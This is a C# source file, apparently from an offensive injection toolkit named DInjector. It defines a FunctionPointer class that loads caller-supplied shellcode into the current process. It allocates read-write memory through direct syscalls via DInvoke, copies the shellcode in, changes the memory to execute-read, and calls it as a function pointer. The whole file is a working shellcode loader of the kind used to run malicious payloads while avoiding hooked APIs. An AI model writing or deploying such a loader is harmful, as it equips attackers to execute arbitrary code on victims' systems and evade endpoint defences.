using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class FunctionPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode)
        {
            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
            f();
        }
    }
}
